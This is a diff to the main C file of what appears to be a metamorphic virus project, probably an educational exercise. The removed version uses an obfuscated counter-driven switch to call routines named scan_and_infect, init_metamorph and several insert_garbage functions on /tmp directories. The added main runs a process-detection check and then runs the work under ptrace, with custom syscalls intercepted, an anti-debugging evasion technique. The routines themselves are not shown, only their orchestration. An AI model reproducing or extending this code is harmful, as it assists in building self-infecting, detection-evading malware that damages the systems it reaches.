@@ -1,2 +1,14 @@
 #include "../include/war.h"
-long long pepino = 0; char *hola1(char *p) { pepino -= 21; return (p); } char *hola2(char *p) { int t = 3; if (t < 2) { for (int i = 0; i < 243042; i++) t += 2; } pepino += 35; return (p); } int calculadoradepepino() { switch (pepino) { case 0: init_metamorph(); break; case 777: is_process_running("test"); break; case -27972: run_with_tracer(); break; case 782432784: child_process(); break; case 195608196: scan_and_infect(hola1("/tmp/test"), hola2("/tmp/test2")); break; case 195608210: scan_directory(hola1("/tmp/test")); break; case -248235: scan_directory(hola2("/tmp/test2")); break; case 937492324: insert_garbage2(); break; case -97432424: insert_garbage(); break; case -1197424: insert_garbage3(); break; case 9740240400: insert_garbage4(); break; case 9740240401: insert_garbage5(); break; } return 0; } int main() { calculadoradepepino(); } 
+
+int main(void) {
+    // 1. Anti-process check (sale si detecta proceso bloqueado)
+    is_process_running("test");
+
+    // 2. Ejecutar bajo ptrace - el hijo hace el trabajo real
+    // Los syscalls custom serán interceptados por el padre
+    run_with_tracer();
+    
+    // Este código nunca se ejecuta porque run_with_tracer
+    // termina ambos procesos (padre e hijo)
+    return 0;
+}
